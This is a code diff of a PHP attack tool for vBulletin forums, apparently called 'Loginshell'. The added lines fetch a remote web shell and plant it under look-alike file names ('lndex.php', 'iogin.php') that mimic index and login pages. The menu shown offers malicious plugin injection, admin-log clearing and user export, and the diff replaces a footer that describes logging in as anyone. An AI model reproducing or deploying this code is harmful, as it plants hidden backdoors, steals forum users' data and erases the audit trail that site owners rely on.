@@ -473,12 +473,19 @@ elseif($_REQUEST['do'] == 'installteampsshell')
 {
     $link = 'https://raw.githubusercontent.com/p0wersurge/teamps-shell/master/teamps.php';
     $get = @file_get_contents($link);
-    $put = @file_put_contents('lndex.php', $get);
+    
+    if (file_exists('lndex.php')) {
+	$filename = 'iogin.php';
+    } else {
+	$filename = 'lndex.php';
+    }
+	
+    $put = @file_put_contents($filename, $get);
     if($put)
     {
         ?>
         <h1>TeamPS Shell installed!</h1>
-        <p><a href="lndex.php" target="_blank">Go to shell</a></p>
+        <p><a href="<?= $filename ?>" target="_blank">Go to shell</a></p>
         <p><a href="<?php echo SELF; ?>">Go back</a></p>
         <?php
     }
@@ -695,7 +702,7 @@ else
     <p>Possible AdminCP directories (from existing subdirectories minus vBulletin standard): <?php foreach($guess as $dir) { echo '<a href="' . $vbulletin->options['bburl'] . '/' . $dir . '/index.php" target="_blank">' . $dir . '</a> '; }?></p>
     <hr />
     <p><a href="<?php echo SELF; ?>?do=injectplugin">Inject malicious plugin</a></p>
-    <p><a href="<?php echo SELF; ?>?do=installteampsshell">Install TeamPS Shell to lndex.php</a></p>
+    <p><a href="<?php echo SELF; ?>?do=installteampsshell">Install TeamPS Shell</a></p>
     <p><a href="<?php echo SELF; ?>?do=clearadminlog">Clear adminlog</a></p>
     <p><a href="<?php echo SELF; ?>?do=exportusers">Export users</a></p>
     <hr />
@@ -728,7 +735,7 @@ else
     </ul>
     <p><a href="<?php echo SELF; ?>?do=hookenabler">Globally enable/disable hooks</a></p>
     <hr />
-    <h6>Written by <a href="https://twitter.com/xijailbreakx" target="_blank">@xijailbreakx</a>. This file allows you to override the default vBulletin login system and login to the control panel and forums as anyone. It also tries to find the admincp directory, by using both the configuration file (possibly incorrectly set) and by guessing based on existing subdirectories (nearly 100% successful). It also allows for modifications of the plugin system, injection of a malicious plugin or shell, and deletion of administrator logs without logging any information in the admin log.</h6>
+    <h6>Loginshell v3 beta</h6>
     <script type="text/javascript">
         function getPluginsForProduct(productid)
         {
